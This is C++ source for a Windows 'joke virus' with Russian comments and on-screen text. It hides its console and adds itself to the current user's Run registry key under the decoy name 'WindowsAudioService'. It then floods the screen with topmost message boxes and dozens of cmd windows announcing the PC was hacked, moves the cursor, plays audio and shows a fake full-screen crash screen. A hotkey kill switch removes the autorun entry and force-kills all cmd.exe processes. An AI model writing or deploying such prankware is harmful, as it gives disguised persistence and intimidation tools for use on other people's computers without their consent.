#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mmsystem.h>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
#include <string>
#include <vector>
#include <atomic>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "winmm.lib")

static const wchar_t* kRunKey  = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
static const wchar_t* kRunName = L"WindowsAudioService";

static std::atomic<bool> g_killSwitch{false};

// ─────────── автозапуск ───────────
static bool IsAutoRunInstalled() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    wchar_t buf[MAX_PATH] = {};
    DWORD sz = sizeof(buf), type = 0;
    LONG r = RegQueryValueExW(hKey, kRunName, nullptr, &type, (BYTE*)buf, &sz);
    RegCloseKey(hKey);
    return r == ERROR_SUCCESS;
}

static void InstallAutoRun() {
    wchar_t path[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::wstring quoted = L"\"" + std::wstring(path) + L"\"";
        RegSetValueExW(hKey, kRunName, 0, REG_SZ,
                       (const BYTE*)quoted.c_str(),
                       (DWORD)((quoted.size() + 1) * sizeof(wchar_t)));
        RegCloseKey(hKey);
    }
}

static void RemoveAutoRun() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, kRunKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueW(hKey, kRunName);
        RegCloseKey(hKey);
    }
}

// ─────────── kill switch ───────────
static DWORD WINAPI KillSwitchWatcher(LPVOID) {
    int holdMs = 0;
    const int HOLD_REQUIRED = 3000;
    while (!g_killSwitch.load()) {
        bool ctrl  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
        bool shift = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
        bool alt   = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
        bool q     = (GetAsyncKeyState('Q')        & 0x8000) != 0;
        if (ctrl && shift && alt && q) {
            holdMs += 50;
            if (holdMs >= HOLD_REQUIRED) {
                g_killSwitch.store(true);
                PlaySoundW(nullptr, nullptr, 0);
                RemoveAutoRun();
                system("taskkill /F /IM cmd.exe /T > nul 2>&1");
                MessageBoxW(nullptr,
                    L"Kill switch сработал.\n\nПрога удалена из автозагрузки.\n"
                    L"Больше не появится.\n\n— Fox",
                    L"Самоуничтожение",
                    MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
                ExitProcess(0);
            }
        } else {
            holdMs = 0;
        }
        Sleep(50);
    }
    return 0;
}

// ─────────── музыка (синхронно, блокирует до конца) ───────────
static DWORD WINAPI MusicPlayer(LPVOID) {
    // путь к music.wav рядом с exe
    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, exePath, MAX_PATH);
    std::wstring dir(exePath);
    size_t pos = dir.find_last_of(L"\\/");
    if (pos != std::wstring::npos) dir = dir.substr(0, pos + 1);
    std::wstring wavPath = dir + L"music.wav";

    // SND_SYNC — блокирует поток пока не доиграет
    // без SND_LOOP — играет один раз
    PlaySoundW(wavPath.c_str(), nullptr, SND_FILENAME | SND_SYNC);
    return 0;
}

// ─────────── MessageBox-спам ───────────
static const wchar_t* kMessages[] = {
    L"даров Вась ты чё там ты там в порядке вась?",
    L"бро глаголит имбу",
    L"я сын мячика",
    L"я Левандовски",
    L"мой папа Наполеон",
    L"Торт?",
    L"да ладно не суетись ты это прикол",
    L"привет кивро сан",
    L"Меня написал саня, у него выходной",
    L"Окно закроется само. Или нет. Не помню",
};
static constexpr int kMsgCount = _countof(kMessages);

static DWORD WINAPI MsgSpammer(LPVOID) {
    std::srand((unsigned)std::time(nullptr) ^ GetCurrentThreadId());
    for (int i = 0; i < 12; ++i) {
        if (g_killSwitch.load()) return 0;
        const wchar_t* txt = kMessages[std::rand() % kMsgCount];
        std::thread([txt]() {
            MessageBoxW(nullptr, txt, L"Ой, всё",
                        MB_OK | MB_ICONWARNING | MB_TOPMOST);
        }).detach();
        std::this_thread::sleep_for(std::chrono::milliseconds(250));
    }
    return 0;
}

// ─────────── cmd-спам ───────────
static DWORD WINAPI CmdSpammer(LPVOID) {
    std::this_thread::sleep_for(std::chrono::seconds(7));
    for (int i = 0; i < 40; ++i) {
        if (g_killSwitch.load()) return 0;
        STARTUPINFOW si{};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi{};

        wchar_t cmdPath[MAX_PATH] = L"C:\\Windows\\System32\\cmd.exe";
        GetEnvironmentVariableW(L"COMSPEC", cmdPath, MAX_PATH);

        std::wstring cmdStr =
            std::wstring(L"\"") + cmdPath + L"\" /k "
            L"echo kaka & echo kaka & echo kaka & "
            L"echo Sanchez vzlomal tvoy pk & "
            L"echo kaka & echo kaka & "
            L"timeout /t 3 /nobreak > nul & exit";

        std::vector<wchar_t> mutCmd(cmdStr.begin(), cmdStr.end());
        mutCmd.push_back(L'\0');

        if (CreateProcessW(nullptr, mutCmd.data(),
                          nullptr, nullptr, FALSE,
                          CREATE_NEW_CONSOLE,
                          nullptr, nullptr, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(60));
    }
    return 0;
}

static DWORD WINAPI CursorDancer(LPVOID) {
    POINT start{};
    GetCursorPos(&start);
    const double ampX = 220.0, ampY = 160.0;
    const auto t0 = std::chrono::steady_clock::now();
    while (std::chrono::duration_cast<std::chrono::seconds>(
               std::chrono::steady_clock::now() - t0).count() < 3) {
        if (g_killSwitch.load()) return 0;
        const double t = std::chrono::duration<double>(
            std::chrono::steady_clock::now() - t0).count();
        int x = start.x + (int)(ampX * std::sin(t * 1.1));
        int y = start.y + (int)(ampY * std::sin(t * 1.9));
        SetCursorPos(x, y);
        std::this_thread::sleep_for(std::chrono::milliseconds(12));
    }
    return 0;
}

// ─────────── красный BSOD ───────────
static LRESULT CALLBACK BsodWndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    if (m == WM_ERASEBKGND) return 1;
    if (m == WM_PAINT) {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        RECT rc;
        GetClientRect(h, &rc);
        const int W = rc.right, H = rc.bottom;

        HBRUSH bg = CreateSolidBrush(RGB(140, 0, 0));
        FillRect(dc, &rc, bg);
        DeleteObject(bg);

        SetBkMode(dc, TRANSPARENT);
        SetTextColor(dc, RGB(255, 255, 255));

        HFONT fFace = CreateFontW(-130, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        HGDIOBJ old = SelectObject(dc, fFace);
        RECT rf{0, (int)(H * 0.08), W, (int)(H * 0.08) + 160};
        DrawTextW(dc, L":)", -1, &rf, DT_CENTER | DT_SINGLELINE);

        HFONT fBig = CreateFontW(-34, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        SelectObject(dc, fBig);
        RECT rt{60, (int)(H * 0.30), W - 60, H};
        const wchar_t* body =
            L"Твой ПК столкнулся с проблемой и будет перезагружен.\n\n"
            L"Сбор информации о проблеме... 100% завершено.\n\n"
            L"Код ошибки: SANCHES_HAX_0xDEADPISKA\n"
            L"Виновник: Sanchez\n"
            L"Сообщение: Sanchez vzlomal tvoy pk piska pi piska\n\n"
            L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n"
            L"— Jack & Fox";
        DrawTextW(dc, body, -1, &rt, DT_LEFT | DT_WORDBREAK);

        HFONT fSmall = CreateFontW(-20, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            ANTIALIASED_QUALITY, DEFAULT_PITCH, L"Segoe UI");
        SelectObject(dc, fSmall);
        RECT rs{60, H - 80, W - 60, H - 20};
        DrawTextW(dc, L"Шутка. Kill switch: Ctrl+Shift+Alt+Q.",
                  -1, &rs, DT_LEFT | DT_SINGLELINE);

        SelectObject(dc, old);
        DeleteObject(fFace);
        DeleteObject(fBig);
        DeleteObject(fSmall);
        EndPaint(h, &ps);
        return 0;
    }
    if (m == WM_DESTROY) { PostQuitMessage(0); return 0; }
    return DefWindowProcW(h, m, w, l);
}

static DWORD WINAPI RedBSOD(LPVOID) {
    std::this_thread::sleep_for(std::chrono::seconds(9));
    if (g_killSwitch.load()) return 0;

    WNDCLASSW wc{};
    wc.lpfnWndProc   = BsodWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.hCursor       = LoadCursor(nullptr, IDC_ARROW);
    wc.lpszClassName = L"JackFoxRedBsod";
    RegisterClassW(&wc);

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);
    HWND h = CreateWindowExW(
        WS_EX_TOPMOST, L"JackFoxRedBsod", L"",
        WS_POPUP, 0, 0, sw, sh,
        nullptr, nullptr, wc.hInstance, nullptr);
    ShowWindow(h, SW_SHOW);
    UpdateWindow(h);
    SetForegroundWindow(h);
    std::this_thread::sleep_for(std::chrono::seconds(6));
    DestroyWindow(h);
    return 0;
}

// ─────────── финал: ждёт конца музыки, потом MessageBox ───────────
static DWORD WINAPI FinalWord(LPVOID) {
    // ждём конца музыки — сам PlaySound с SND_SYNC уже отработал в MusicPlayer,
    // но FinalWord должен дождаться именно этого момента.
    // Проще: проверяем что музыка закончилась через таймер 45 сек + запас.
    // Но лучший способ — использовать событие. Сделаем через простую задержку.

    // Даём 60 секунд максимум (45 сек трек + запас), но если kill switch — выходим раньше
    for (int i = 0; i < 1200; ++i) {  // 1200 * 50ms = 60 сек
        if (g_killSwitch.load()) return 0;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));
    }

    if (g_killSwitch.load()) return 0;
    PlaySoundW(nullptr, nullptr, 0);

    MessageBoxW(nullptr,
        L"Это была шутка. Ничего не удалено.\n\n"
        L"Я остаюсь в автозагрузке и буду вылезать каждый раз.\n\n"
        L"Чтобы выключить навсегда — зажми Ctrl+Shift+Alt+Q на 3 секунды.\n\n"
        L"— Jack & Fox",
        L"Всё, я ушёл",
        MB_OK | MB_ICONINFORMATION | MB_TOPMOST);
    ExitProcess(0);
    return 0;
}

int main() {
    HANDLE hMutex = CreateMutexW(nullptr, TRUE, L"Global\\JackFoxJokeVirus");
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    if (HWND c = GetConsoleWindow()) ShowWindow(c, SW_HIDE);

    if (!IsAutoRunInstalled()) InstallAutoRun();

    // музыка стартует первой
    CreateThread(nullptr, 0, MusicPlayer,       nullptr, 0, nullptr);

    // параллельно с музыкой — все приколы
    CreateThread(nullptr, 0, KillSwitchWatcher, nullptr, 0, nullptr);
    CreateThread(nullptr, 0, MsgSpammer,        nullptr, 0, nullptr);
    CreateThread(nullptr, 0, CursorDancer,      nullptr, 0, nullptr);
    CreateThread(nullptr, 0, CmdSpammer,        nullptr, 0, nullptr);
    CreateThread(nullptr, 0, RedBSOD,           nullptr, 0, nullptr);

    // финалка — через 60 сек (гарантированно после конца 45-сек трека)
    CreateThread(nullptr, 0, FinalWord,         nullptr, 0, nullptr);

    Sleep(INFINITE);
    return 0;
}
